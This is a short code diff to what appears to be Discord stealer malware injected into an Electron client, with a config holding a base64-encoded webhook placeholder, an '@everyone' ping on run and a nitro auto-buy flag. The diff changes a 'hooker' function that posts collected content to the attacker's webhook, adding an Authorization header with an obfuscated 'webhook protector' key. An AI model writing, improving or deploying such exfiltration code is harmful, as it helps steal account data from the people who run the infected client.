@@ -10,7 +10,7 @@ const {
 } = require('electron');
 const config = {
   webhook: atob('%WEBHOOKHEREBASE64ENCODED%'),
-  webhook_protector_key: '%WEBHOOK_KEY%',
+  webhook_protector_key: atob('%WEBHOOK_KEY%'),
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
@@ -602,7 +602,8 @@ const hooker = async content => {
     const data = JSON.stringify(content);
   
     const headers = {
-      "Content-Type": "application/json"
+      "Content-Type": "application/json",
+      "Authorization": config.webhook_protector_key
     };
   
     const options = {
